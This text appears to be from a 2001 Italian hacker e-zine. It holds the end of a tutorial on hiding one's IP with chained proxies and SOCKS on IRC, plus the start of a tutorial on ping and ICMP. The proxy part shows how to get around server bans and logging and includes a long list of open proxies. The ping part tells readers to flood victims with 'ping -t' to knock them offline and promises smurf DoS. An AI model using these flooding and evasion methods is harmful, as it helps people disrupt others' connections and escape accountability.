Ricordatevi ke i proxy ( porte 80, 8080, 3128 ) naskonod l'ip solo sull'80 ( http ). Quindi per
esempio se voi visitate un sito col proxy siete coperti, ma se sul sito c'è una javachat, e voi
ci entrate, non siete più coperti, perkè la porta in questione cambia! Un altro metodo più
efficase per usare i proxy, è andare nelle proprietà della vostra connesione, e inserire lì il vostro
proxy. In questo modo lo userà automatikamente con il vostro dial-up


C'e` anke un altro metodo più rudimentale e grezzo per usare i proxy: Basta immettere nella barra
degli url del vostro browser, l'indirizzo e laporta del vostro proxy, seguido da uno SLASH e dal
sito ke volete visitare: Esempio www.mioproxy.com:8080/www.sitodavedere.com . Semplice no?
Avete avuto un intuizione? si???? ki kazzo siete ??!! Se la risposta è no siete più normali:)
Beh diciamo ke sapendo ke più o meno il 20% dei proxy logga, per avere una certezza di stare
anonimi, è molto utili concatenare diversi proxy,  ( kazzo su 10 proxy ce ne sarà uno ke non logga!).
Qui bisogna agire sempre sull url dal browser:

www.mioproxy.com:8080/www.mioproxy2.net:80/www.mioproxy3.org:3128/www.mioproxyN./nasa.gov

Capito il sistema? Semplice no? come no... suddai ke l'hai kapito anke te... rileggi .. Kapito??
ok:). Io consiglio sempre di usare proxy anonymus per qualsiasi cosa :)))

Uhm.... Ringrazio XhaNtIC` ke mi ha appena fornito queste informazioni..... Per concatenare più proxy
c'è un programma molto utile ke ci aiuta a svolgere i nostri lavorozzi:) MAggiore sarà il
numero dei proxy, e maggiore sarà la lentezza... Scegliete voi tra la galera o la bassa velocità!
Il programma si kiama MultyProxy, e potete skarikare la 1.2 dal mio sito all' url:
http://members.xoom.it/vetranks2000/mproxy12.zip ! Nel sito ufficiale ( http://www.multiproxy.org )
sono presenti in oltre molte altre utiliti, proxy list o anonimizer :)) Passiamo ora a vedere
come funziona il programma! Diciamo ke rende il vostro pc un proxy, accessibile solo dal localhost
127.0.0.1, e questo in backround usa i proxy ke voi gli immettete nella lista. Ora non sconfinerò
troppo nelle varie funzionalità del programma: una volta aperto, andate su Option... e successivamente
su Proxy Server List! Li dovrete immettere i vostry proxy. Potete usare "tasto dx mouse ---> ADD"
uppure carikare una intera lista di proxy. Io vi consiglio al massimo di utilizzatre 5/6 proxy
e di guardare ke siano funzionandi testandoli, e ke il ping sia inferiore a 500! Una volta
configurato il programma, dovrete andare nella proprietà della connessione, e inserire come
server proxy "127.0.0.1" sulla "8088". FAte ok e riavviate il browsers:) e il gioko è fatto.
Se volete utilizzare proxy quindi, rikordatevi di avviare "multiproxy" prima d aprire il browser.
Se avete problemi con il prog. consultate l'help ul sito ufficiale, o scrivetemi. Per testare
se i vostri proxy funzionano andate su http://privacy.net/anonimyzer e confrontate se l'ip ke
riporta sulla pagina è uguale al vostro... Se sono diversi allora i proxy funzionanO. Buon
divertimento!!


Uhm mi sa ke ora vado a dormire ke è tardi... Domani continuo con i proxy e le sock in irc:) !


[4.2.2] Irc sock         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

EKkomi sveglio. =) in questo paragrafo descriverò come usare le sock con Mirc, perkè è il client
più diffuso... kiedo skusa agli utenti di linux ( kVirc ), ma ora non ho sotto mano unix, quindi
non vi saprei dire come si fa... =) . Dai la prossima volta lo scrivo anke per voi :=P.

Allora, inizio con il dirvi ke le sock possono essere utilizzate solo per irc, e non hanno quasi
nulla a ke fare con i proxy ok??? Bene... per trovare sock, oltre alle numerose liste sulla rete,
dovete procurarvi qualke script ( ex. Ultima Irc ) ke fa uno scan on join sulla 1080 ( sock ).
quindi entrate in un canale molto numeroso e aspettate il risultato dello scan:) Esistono 2 tipi
di sock: La sock4 , ke è lo STANDARD e la più utilizzata , e la sock5 , ke è utilizzata veramente
pokissimo, anzi io NON l'ho mai usata, quindi non vi so dire... SO solo ke è sempre sulla 1080.
Per configurarvi la sock sul mirc dovrete aprire le opzioni dal menù file--> option, oppure
con " alt + o ", oppure con la seconda icona in alto a destra del mirc :) Sul dialog ke vi si è
appena aperto andate sulle opzioni della connessione ( connect ) e poi al sottomenù "Firewall".
Voi dovrete lavorare solo ed esklusivamente su questa skermata... Iniziate con l'abilitare
"Use firewall" , successivamente dovrete scegliere il protocollo... in questo caso stiamo parlando
di sock, e quindi selezionate sock4. Nel from "hostname" dovrete inserire l'ip o l'host della
sock ke intendete utilizzare. I campi user ID e password lasciateli vuoti, a meno ke la sock non
li rikieda, ma è molto improbabile. Nel campo della porta inserite 1080, ke per le sock è sempre
uguale! Bene ora clikkate su "ok", e ora, come penserete voi, abbiamo finito. ASSOLUTAMENTE NO!
Devo cominciare col dire, ke molte sock sono k-lineate da molti server irc, è quindi necessario
cambiare sock. Molti server invece hanno un controllo di sock on connect, ovvero quando noi ci
connettiamo a irc, controllano la nostra 1080 ( e anke altre... ) e se è aperta, ci killano dal
server. KazzO! Poi la maggior parte sei server accetta connessioni solo da domini uguali al suo
e da quelli internazionali. Exaple: il server irc.asdijdassa.jp , accetterà connessioni solamente
dagli host .jp, .com, .org, .net, gov ..ecc, ma non gli altri domini nazionalI ( it, uk, ar... ).
Quindi è ovvio ke se avete una sock .jp, non potete pretendere di connetterevi a un server italiano,
ma dovrete trovare un server linkato a quella rete, con il dominio .jp . Per vedere quali server
sono linkati a una determinata rete basta usare il comando /links del mirc. Parlando di ircNET,
ci sono server come irc.stalth.net sulla 5552, ke accettano tutti gli host ;))) Non è un caso
se tutti gli eggdrop sono su quel server :). Invece connettersi ad aZZurranet con sock4, è
totalmente impossibile, perkè è uno di quei server ke ti controlla la 1080..... c'è cmq un modo,
e ne parlerò dopo. Altre net di irc come webchat ( irc.webmaster.com ) accettano host provenienti
da qualsiasi parte del mondo:) . Si può stare quindi trankuilli. Ma ora tokka a voi e alla vostra
mente selezionare la sock giuste per il server giusto. Come al solito se non ci riuscite sapete
dove trovarmi :) Se provate connettervi a una sock non funzionante, o su un server ke non accetta
firewall il Mirc vi darà un messaggio del tipo
***Unable to connect to firewall
In questo kaso non c'è niente da fare, apparte kambiare sock o server :) Credo di essere stato
abbastanza kiaro sulle sock... Ora vediamo come connetterci a irc attraverso i proxy ;)


[4.2.3] Irc proxy        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Avete problemI con le sock? non riuscite a trovarne? ne avete trovate ma nessuna va bene per il
vostro server preferito? Il vostro server ha protezioni sulla 1080? Mai pensato al suicidio??
SUHUHSUHSA no skerzo. Beh allora a tutto questo c'è un alternativa...Potete maskerare il vostro
ip in irc, usando i proxy, quelli normalissimi per http di cui ho parlato prima. La convenienza
è ke ce ne sono veramente tantissimi, e ke usano porte diverse dalla 1080,( 8080, 80, 8088, 3128 )
e talvolta è possibile  ingannare le protezioni dei server:).
Per usare i proxy, il procedimento è uguale a quello per le sock... Nelle opzioni del firewall
di mirc, invece ke mettere come protocollo sock4, e come porta la 1080, dovrete mettere
rispettivamente: proxy, e la porta ke usa il proxy! In questo modo potrete connettervi con proxy
e stare più tranquilli. Per reti come azzurranet, vi consiglio di provare i proxy sulla 3128,
e con dominio .net .com o .org . A volte funzionano!! Non credo ke ci sia altro da dire perkè
l'uso è uguale alle sock:)

[4.2.5] Sock WinCrt      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Conoscete wincRT? Come nO??? Beh allora ve lo diko io cos'è.... ! E` un client molto simile al
telnet, ma con molte funzioni in più, ke di certo non analizerò ora, ma ce n'è una in particolare
ke serve a noi :). Come nel mirc, prima di connetterti a qualsiasi host, puoi essere coperto da
una sock4, una sock5, o un proxy!!! Il programma lo potete downloaddare all'url:
http://members.xoom.it/vetranks2000/wincrt.zip
Una volta installato andate sul menù Option--->General preferences--->Firewall . La skermata ke
vi si presenterà davanti, sarà molto simile a quella del mIRC quindi non credo ke devo spiegarvi
ankora qualkosa.... In questo modo ogni volta ke vi telnettere da qualke parte, per skopi leciti
o illeciti, sarete sempre coperti da un ip non vostro ( buonA!! ) . Per manggiore sikurezza consiglio
cmq si usare i wingate ( leggere tutorial su http://mojodo.cjb.net )


[4.3] Sock != Socket    ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Io so ke molta gente, molti lamah, molti utenti alle prime armi, confondono le sock con i socket.
Ragazzi è inutile ke ridete.... anke se sapete già tutto non me ne frega un kazzo... ci siete
passati tutti.. ci sono passato pure io, e credo ke sia impossibile altare le tappe. quindi vorrei
specifikare a tutti quelli ke ankora non lo sanno ke le sock sono completamente diversi dai SOCKet.
I socket sono programmati in c... e ora io non so bene a cosa servono perkè di programmazione non
me ne intendo, ma vi assikuro ke non centrano un kazzo con le sock:) EKko mi sono sfogato!!!


[4.4] Proxy list        ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Non so perkè ma devo smentire tutto quello ke ho detto prima...:) sikkome sono buono buonino
vi passo una bella lista di proxy, cose siete apposto per un po. Divertitevi


adsl-216-100-84-58.dsl.lsan03.pacbell.net:80
venturi.fourelle.com:8080
bess3.proxy.lacoe.edu:8080
209.242.141.249:8080
home.raton.com:3128
proxy.sjc.netsetter.com:80
wforest.ocs.k12.al.us:80
eebsd.ee.ncku.edu.tw:3128
south.ocs.k12.al.us:80
proxy.iad3.netsetter.com:80
webcache.bt.net:8080
pegase.cslacst-jean.qc.ca:8080
proxy.ord.netsetter.com:80
go.becker.edu:8080
216.126.197.52:80
northcan.neo.rr.com:8080
proxy.iad4.netsetter.com:80
north.ocs.k12.al.us:80
webcache.bt.net:3128
www.erinet.com:1080
bess-proxy.wv-cis.net:8902
tftp.acd.net:80
www.yorosiku.net:8080
cartman.thenap.net:80
netcache4.entelchile.net:80
cache.nexicom.net:80
cartman.thenap.net:3128
carver.ocs.k12.al.us:80
proxy.lga.netsetter.com:80
195.171.169.114:80
webserver.cclslib.org:80
proxy.meschede.uni-paderborn.de:8080
escnd1-blk1-hfc-0251-d1db0287.rdc1.sdca.coxatwork.com:80
rdja1ts1.ri.br.prserv.net:80
dyna0.islandia.is:8080
titan.datainternet.com:8080
195.223.55.131:80
195.223.69.196:80
194-23-172-2.vasteras.se:80
195.103.124.10:80
netcachesyd3.ozemail.com.au:80
www.escorts.co.jp:8000
netcache5.entelchile.net:80
cobra.braenet.com.au:80
jeter.ocs.k12.al.us:80
210.96.39.101:80
bess-proxy.eclipse.net:8901
bess-proxy.intac.net:8640
www.mariazell.org:80
ncache02.terra.cl:80
212.45.129.70:8080
morris.ocs.k12.al.us:80
netcache2.entelchile.net:80
ncache03.terra.cl:80
netcachesyd3.ozemail.com.au:8080
melcache01.powertel.net.au:80
ncache04.terra.cl:80
netcache1.entelchile.net:80
cache.tmx.com.ni:80
proxy.ozemail.com.au:80
195.31.181.131:80
cuix3.pscu.com:8080
netcachesyd2.ozemail.com.au:80
brocksec.sd73.bc.ca:80
proxy.ozemail.com.au:8080
ncache01.terra.cl:80
209-9-133-3.sdsl.cais.net:80
webserver.augusta.k12.va.us:80
195.231.27.2:80
netcache6.entelchile.net:80
netcache2.qualitynet.net:80
home.fr.clara.net:8080
195.215.187.138:80
1gym-aigiou.ach.sch.gr:80
netcachesyd2.ozemail.com.au:8080
195.231.103.194:80
ns.aip.pt:80
proxy.qualitynet.net:80
internet-server.ebf.com.br:80
gate.pcn.net:8080
numancia1.vhebron.es:80
eve.hannam.ac.kr:8080
proxy.sut.ac.th:8080
195.229.104.195:80
bess1.proxy.lacoe.edu:8080
proxy1.pronet.it:80
edinburgh-88.edinburgh.k12.in.us:8801
eunice.clifton.ca:80
202.104.122.229:80
www.sarpsborg.com:80
alive.pcnet.or.jp:3128
proxy.bnet.net.tr:8080
195.112.159.2:80
212.150.197.26:80
proxy.bnet.net.tr:80
194.42.145.2:80
203.93.222.250:80
202.41.106.101:80
202.56.240.57:80
mail.zipp.sk:8080
mail.klimatair.gr:80
195.142.170.3:80
proxy1.qatar.net.qa:8080
212.29.231.2:80
cf.thn.ne.jp:8080
194.27.53.4:80
proxy.druknet.net.bt:8080
194.78.5.114:80
200.21.224.121:3128
200.195.224.3:8080
195.229.32.2:80
152.158.247.97:80
tsnet2.telesis-net.co.jp:3128
195.224.214.226:80
202.163.226.37:3128
128.134.130.32:80
163.178.8.18:80
202.44.245.30:8080
194.65.31.92:80
mail.uraltelecom.ru:8080
195.103.225.71:80
12.18.19.122:8080
61.133.111.130:80
cresta01.cresta.com.tr:80
pad203108167075.ozemail.com.au:8080
195.145.112.194:8080
rub077.li00.c1.interbusiness.it:80
212.49.87.254:3128
208-169-172-149.hou.accelernet.net:80
mailgate.btmldn.com:80
gateway.spc.com.au:8080
bashinform.ru:3128
ns0.apecs.co.jp:8080
mail.paxarfal.com.hk:80
195.229.189.2:80
195.207.79.251:80
147.45.130.6:9000
earth.njcc.com:3128
195.215.192.171:80
194.65.77.2:80
proxy.multiwire.net:8080
195.222.47.205:80
202.152.6.131:80
lynx.pitek.fi:8080
inters2.lnk.telstra.net:8080
dppiu.elcat.kg:3128
195.116.218.236:8080
194.12.232.40:80
server.scheiber.sulinet.hu:80
200.251.250.42:80
ns.edimpres.com.ec:3128
194.190.209.164:8080
195.222.47.203:80



[5]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* 3nD * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Beh sono giunto alla fine. Spero di essere stato kiaro... per più informazioni o/e kiarimenti,
advanced@mojodo.cjb.net ,. Bestemmie, insulti e complimenti sono sempre bene accetti.
Miraccomando fatevi sentire e studiate...... studiateeeeeeee leggete più testi possibili.


Saluto tantissimo:ZIo_T0m,#dbzone,^Flash^,fede,MakEatMe,XaNtHic`,NetDIgger,Stan,Valk,Mamma,
       `aLe` Tvb,Ade, #mojodo, #tcc, #newbie, #smanettoni, #hack, e soprattutto #free.it.warez

Fuck To: `Cate`, Pariolini-Sancarlini e affini, BinLaden, Laziali, IRcop e Fix, e HOUSE MUSIC

----------------------------------------
[Kvirc status]

/quit Go to bed

***Disconnected
----------------------------------------

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


------------------------------------*END*--------------------------------------


------------------------------------[16]---------------------------------------
---------------------------------[Advanced]------------------------------------
---------------------------------[Ping?Pong]-----------------------------------


|²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+
|                        								     |
|~~~~~~~~~~~~~~~~~~~~~²²²²²²²²********  PING?PONG!   ********²²²²²²²²²²~~~~~~~~~~~~~~~~~~~~~~|
|											     |
|²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+~*~²~+




[x]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* S0mm4r10 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

--[x] Sommario       -------- Indice/struttura del txt
--[1] Info           -------- Note/info sull'autore
--[2] Intro          -------- Testo introduttivo/saluti
--[3] Disclimer      -------- Responsabilità
--[4] PING!PONG!     -------- Tutorial sul Ping
---[4.1] Che cos'è     -------> Introduzione al Ping
---[4.2] Come funziona -------> Funzionamento dei pakketti
---[4.3] Come si usa   -------> Uso del programma "ping"
---[4.4] Tipi di Ping  -------> Varie modalità di Ping
----[4.4.1] CtCp Ping    ------->> Ctcp Ping da irc
----[4.4.2] Icmp Ping    ------->> Ping con pakketti ICMP
----[4.4.3] Echo Ping    ------->> Ping con porta echo
----[4.4.4] Fping        ------->> Ping multiplo
----[4.4.5] Ping Sweep   ------->> Ping approfondito con Nmap
---[4.5] Smurf         -------> Spiegazione dello Smurfing
--[5] Sfogo          -------- Notizie non affini al Ping
--[6] End            -------- Conclusioni, note finali

[1]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* Inf0 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Date:05/11/01 -16.51 p.m
Author:ADvAnCeD`

MailTo:advanced@mojodo.cjb.net
Web: http://advanced.too.it


[2]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* InTr0 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Ciao a tutti ragà.Non avete altro da fare allora avete deciso di leggere questo txt ke avete
appena scaricato da qualke sito? Bene sono qio per tenervi occupati con un po di cosette
basilari, niente di difficile, non si rikiede nessuna conoscenza particolare per leggere.
Uhm, sono qui a casa, roma, fuori piove,non ho un kazzo da fare, non mi va di studiare quindi
ke faccio? Scrivo per voi:).Oggi a skuola mentre mileggevo il mio bel libretto di hacking
invece di seguire le lezioni di merda, mi è venuto in mente di scrivere questo articolo sul
PING :\. No, non sono un hacker ( UffA!! ), non sono un cazzo, io sono solo ADvAnCeD`, un
ragazzo con tanta voglia di ( (|) ) sapere e imparare :)))). Saluto tutti i miei amici ke mi
tengono compagnia ogni volta ke apro il mio mIRC e clikko su quel tasto ke provoca dipendenza
di massa: "connetti". Grazie a tutti. Saluto tutta la mia crew ,mojodo, ke sta andando alla
grande, saluto poi i moltissimi ABITANTI di #dbzone, il chan del sito dbzone.it, ke in questo
periodo ha avuto un po' di sussulti ma cmq sta tornando tutto normale. Inoltra ringrazio tutto
lo staff della VenInside-zine ( http://vig.cjb.net ), un team di ragazzi molto in gamba, ke sta
scrivendo un e-zine molto completa, con cui io collaboro direttamente. SI si, ora rrivo anke
al Ping state calmi :) so ke avete sete. Bene spero ke queste informazioni vi siano utili e
ke le utilizziate al meglio.

[3]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* D1sCl4im3r * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Secondo me, queste 2 parole ke torvi su tutti i siti in cui vai, tutti i documenti ke leggi,
tutte le guide atte a espandere delle cose ke "poki" sanno, non servono assolutamente a un
KAZZO!!! beh cmq molti dicono ke è necessario, quindi ce lo metto pure io...

-Tutte le informazioni che troverete in questo documento sono a puro scopo informativo,
-e l'autore non incita i lettori a provare e effettuare manovre che potrebbero causare danni
-a terzi.Io, l'autore, non mi assumo nessuna responsabilità.



[4]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ * PING?PONG! *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Ekko da qui si comincia a parlare seriamente sull'argomento;9 skusate se vi ho rotto il kazzo
fino ad'ora:) Buona lettura.

[4.1]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* Ch3 c0s'3` * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Beh, i primi tempi in cui usavo internet, irc e quando ankora ero INiorante, ero molto colpito
da questa scritta ke tempestava il mio monitor: qualsiasi cosa facessi, da qualsiasi parte
andassi, trovavo queste 2 parole ke mi riekkeggiavano nella testa come un martello: PIN!PONG?.
Per esempio nel mIRC intere skermate dello status riempite con queste poke letterine.
-
PING? PONG!
-
PING? PONG!
-
PING? PONG!
-
Ma ke kazzo è? si kiedeva la mia mentolina lamah. Ho un pc particolarmente sportivo ? Adora gli
sport da tavolo come il ping - pong, e ogni tanto fà 2 tiri con il server? no :)
Inoltre quandi stavo a sentire la gente ke parlava in vari canali, sentivo frasi del tipo
"Ora ti pingo e cadi " " Mi hanno pingato e sono caduto " "Fammi un ctcp ping per vedere il
mio lag".... :) Bene in quei momenti ero molto confuso perkè non capivo ke kazzom dicessero,
ma nemmeno quelli ke scrivevano stavano effettivamente comprendendo le kose ke dicevano:)
Ora vi spiego io ke kos'è il Ping. Il ping è un programma, ke sta su qualunkue sistema operativo,
su qualunkue makkina, 386, solaris, unix e windows. Questo programma è molto semplice da usare,
e spesso funziona in backrounnd, ovvero il nostro pc usa Ping senza ke noi lo sappiamo.
Ping serve per capire se una makkina in rete  è connessa e funzionante, e funziona in un modo
semplicissimo: skematizziamolo con un disegno

|---------|                |---------|
|  pc1    | -----PING?---> |  pc 2   |
|         | <----PONG!---- |         |
|---------|                |---------|

Beh questo è molto semplice direi:) E` come se i sue pc comunicassero tra di loro e si kiedessero:

pc1: Ci 6? ( PING? )
pc2: Si ci sono ( PONG! )

Bene questa elementare tecnika serve per molte cose... per esempioquando noi ci colleghiamo al
isp ( provider ), questo, ogni determinati secondi, ci invia un PING! per verificare se siamo
effettivamente connessi alla rete. In caso di mancata risposta, il server kiuderà là nostra
connessione, pensando ke siamo caduti. Questo avveine ugualmente per i server irc, ke ogni
200 secondi ci inviano una rikiesta di ping e noi rispondiamo con il pong, per fargli capire
ke siamo connessi a attivi sul server. Questo lo fa automatikamente il mIRC, quindi noi ce ne
accorgiamo solo da quelle scritte nello status:

-
PING? PONG!
-

Nel caso di irc lo skerma è più o meno questO:

|---------|                |---------|
| Client  | <---PING?----  |   IRC   |
|         | ----PONG!--->  |  Server |
|---------|                |---------|

Il server irc kiede a noi ( client ) se siamo connessi ( PING? ) ogni 200 secondi. Se per caso
un client si diskonnette bruskamente dal server, magari perkè gli salta la corrente o perkè
lo buttano giù, il server non se ne accorge subito, ma solo dopo ke il client non risponde più
alla sua rikiesta di ping, quindi voi vedrete l'utente cadere per PING timeout, ovvero mancata
risposta al ping del server irc.

*** HopeHack has quit irc ( Ping Time Out )

Skusa andrea:P. Bene ora credo ke avete più o meno capito il meccanismo del ping, spero:)
Beh ora per farvi rendere meglio conto di come funziona, provate a connettervi a un server
IRc con il telnet. Non sapete come fare? bene ve lo spiego io... Se usate windows aprite
C:/windows/telnet.exe , e connettetvi al server irc.tin.it sulla 6667, se invece usate LINUX:)
aprite il terminale e scrivete:

[root@advanced]#telnet irc.tin.it 6667

Bene ora vi sembrerà strano, ma il server non vi dirà assolutamente nulla. niente di più normale!
Sta solo aspettando ke gli forniate vostri dati. Digitate quindi

user 0 0 0 0
nick ADvanced

E dopo di ke vi si visualizzerà il MOTD nella finestra. Non mi sembra difficile quello ke abbiamo
fatto: abbiamo detto al server irc, i nostri dati ( user 0 0 0 0 ) e successivamente abbiamo
inserito il nick ( nick ADvAncEd ). Tutto qui, ora potete usarlo come un normale mIRC, senza
usare la / davanti ai comandi. :) Solo ke.... badabooOOom. Ad un tratto, mentre noi fattikiamo
per joinare in un canale con questo client DISabituale.... ci troviamo sconnessi dal server

**Connection refused**

Come mai??????????????? :) beh ora devo andare a ripetizioni di biologia:=) torno e ve lo spiego.
Buh ekkomi sono tornato:) Allora... quando noi ci siamo connessi al server irc, dopo 200 secondi
questo, ha inviato una rikiesta di PING! al nostro client ( telnet ) e il nostro telnet non ha
risposto al PING!, perkè non è impostato per farlo automatikamente!!!! quindi il server ha
creduto ke noi fossimo caduti, e ci ha diskonnesso.... Il mirc invece, come potete capire,
non è così diverso da Telnet, ma una differenza è ke mirc, appena riceve una rikiesta di ping,
risponde subio in automatico con un bel PONG! :) bene dai anke kuesta è fatta spero abbiate kapito.
Bene ora credo ke voi abbiate capito kosa sia il ping :) Beh ora passiamo a capire kome funziona
in realtà, ovvero ke kosa c'è dietro:).

[4.3]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* C0m3 FuNz10n4 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Saoete ke kos'è un pakketto? Non quelli ke si inviano per posta... quelli ke viaggiano sui
protocolli di rete.... Bene avete presente? Ci sono vari tipi di pakketti ( tcp/ip, udp, icmp..)
, e il nostro ping non è altro ke un tipo molto semplice di pakketto icmp. Beh in questo doc
non staremo qui molto ad approfondire sui pakketti icmp, ma tra poko scrivero un txt solo su
questo argomento così lo potrete capire meglio, e sikuramente lo troverete sul sito della crew
( http://mojodo.cjb.net ) . Allora il Ping!  non è altro ke un pakketto ICMP ECHO REQUEST,
contenente la stringa PING!. Appena una macchina riceve questo tipo di pakketto, se tutto
funziona correttamente, e "ping" è correttamente installato, risponde inviando un pakketto
ICMP ECHO REPLY, all'ip di provenienza della rikiesta... Semplice no?

|-------|                                           |-------|
|       | -------ICMP_ECHO_REQUEST-------------->>  |       |
| pc 1  |                                           |  pc 2 |
|       | <<-----ICMP_ECHO_REPLY------------------  |       |
|-------|                                           |-------|

Undestand? ok.I pakketti inviati di solito sono + di uno, e con grandezza (paket size) variabile.
Beh diciamo ke quando io col mio 56 k invio un semplice ping con paketsize di default, non accade
assolutamente nulla di negativo alla makkina di destinazione. Ma se io pingo dalla mia shell con
t3 ripetutamente un host, con paket size molto alta.... Sekondo voi ke kosa succede? sikuramente
il remote host cade.... si diskonnette, perkè noi gli abbiamo occupato tutta la banda coni nostri
ping, e quello badabooOOm. Se voi avete adsl e volete far cadere un vostro amiko con 56 k, non
sarà una cosa facile, ma cmq gli rallenterete di molto la connesione se lo pingate continuamente.
Se invece uno col 56 k prova a pingarvi, e voi avete adsl, il lamah cadera indegnosamente :))).
Quindi avete capito come si può sfruttare questo ping per rallentare o disconnettere utenti....
Beh però non sempre, anzi il + delle volte, noi non abbiamo adsl, o t1, o una shell con t3....
Quindi bisognerà rikorre ad una tecnika DoS ( denial of service ) per disconnettere macchine
remote... Questa teknika è kiamata smurfing ( lhaMA!! ) e ne parleremo brevemente in seguito.
Ora passiamo all'uso vero e proprio del programma ping.

[4.3]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* C0m3 s1 us4 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Suddivido questo paragrafo in due parti: La parte per gli UtOnti di windows, e una per gli users
di unix/linux :) Decidete voi a sekonda del vostro OS kosa legggere:)

------------------------------------------Microsoft Windows-------------------------------------

Beh... se state leggendo questa parte vi consiglio di usare linux :) Cmq per pingare, aprite il
Prompt di Ms DoS, ( Start>Programmmi>Prompt DI msDOs ). Vi troverete una bestemmia del tipo
C:\WINDOWS>
Beh... Per far partire il programma ping.... scrivete ping e premete invio.

C:\WINDOWS>ping

Bene ora vi dovrebbe dare l'istruzioni sulle opzioni del ping! sono veramente molte wow! Bene a
noi però ( perlomeno a me ) non ce ne frega un kazzo del 99% di quelle:). Beh per pingare un
host ( provate ora con il localhost ), basterà scrivere ping indirizzo_ip
Per esempio provate a pingarvi da soli. Scrivete

------------------------------------------------------------|
C:\WINDOWS>ping 127.0.0.1                                   |
Esecuzione di Ping 127.0.0.1 con 32 Byte di dati in corso...|
                                                            |
Risposta da 127.0.0.1: byte=32 Durata =1ms TTL?128          |
Risposta da 127.0.0.1: byte=32 Durata <10ms TTL?128         |
Risposta da 127.0.0.1: byte=32 Durata <10ms TTL?128         |
Risposta da 127.0.0.1: byte=32 Durata <10ms TTL?128         |
						            |
Statistiche Ping per 127.0.0.1 :                            |
Pacchetti= Trasmessi 4, Ricevuti 4,Persi 0 ( 0% persi )     |
Tempo approssimativo andata/ritorno in millisecondi:        |
Minimo = 0 ms, Massimo = 1 ms, Medio 0 ms                   |
------------------------------------------------------------|

Bene diciamo ke è tutto apposto. Tutto quadra! Di defoult il ping di windows manda 4 pakketti,
elabora la risposta e ve la da in output... Credo ke riuscite tutti a capire ke la macchina in
questione ( la mia ) non ha nessun problema. Questo ping vi da anke un altra informazione utile,
ovvero il tempo andata ritorno dei pakketti, ke serve per vedere il ritardo di pc in rete,
ovvero il suo lag. Se questo valore è molto alto, signifika ke ha una connesione molto lenta, e
nel caso di un server questo è grave, perkè potrebbe avere troppa banda okkupata!

Beh ora proviamo a vedere quale sarebbe il risultato se il ping non giuge a destinazione ( ho
provato a pingare un ip a caso )

-------------------------------------------------------------|
C:\WINDOWS>ping 127.0.0.1				     |
Esecuzione di Ping 0.4.121.5 con 32 Byte di dati in corso... |
							     |
Host di destinazione non raggiungibile                       |
Host di destinazione non raggiungibile                       |
Host di destinazione non raggiungibile                       |
Host di destinazione non raggiungibile                       |
							     |
Statistiche Ping per 127.0.0.1 :                             |
Pacchetti= Trasmessi 4, Ricevuti 0,Persi 4 ( 100% persi )    |
Tempo approssimativo andata/ritorno in millisecondi:         |
Minimo = 0 ms, Massimo = 0 ms, Medio 0 ms                    |
-------------------------------------------------------------|

Mi sembra kiaro ke il ping serve anke per vedere se un host in rete è connesso o no! In questo
caso: NO. Ma può darsi anke ke l'hos di destinazione non sia "irraggiungibile" come in questo
caso: ovvero può essere ke il nostro programma i pakketti li invia correttamente, e ke l'host
di destinazione li riceve anke, ma non risponde con un pakketto ICMP_ECHO_REPLY, quindi vuol dire
ke l'host è connesso, ma ha gravi problemi col networking!
Un altra possibilità è ke vi dia "Rikiesta scaduta", ke non so bene cosa sia, ma cmq non è bello:)
Proviamo il ping ora con varie opzioni.

Beh c'è l'opzione -t ke è molto utile. Ovvero pinga l'host infinite volte, finkè uno dei due si
blokka o si diskonnette ( molto utile da shell con t1 o se avete adsl contro un 56/28k :) ) Per
usarlo: ping -t hostvittima

L'opzione -a risolve gli indirizzi in nomi host...HuM WOW! :) fa da ping e contemporaneamente da
Dns ( per info sui dns leggere l'articolo di xhantic sui DNS http://mojodo.cjb.net ).

L'opzione -n numero manda un numero a vostra scelta di pakketti invece ke 4 ( defoult )
ping -n 6000000 127.0.0.1 manderà 6000000 ping al vostro host:)

L'opzione -f imposta l'opzione di non frammentare il pakketto ( utile se avete una linea veloce
e volete mandare pakketti abnormi )

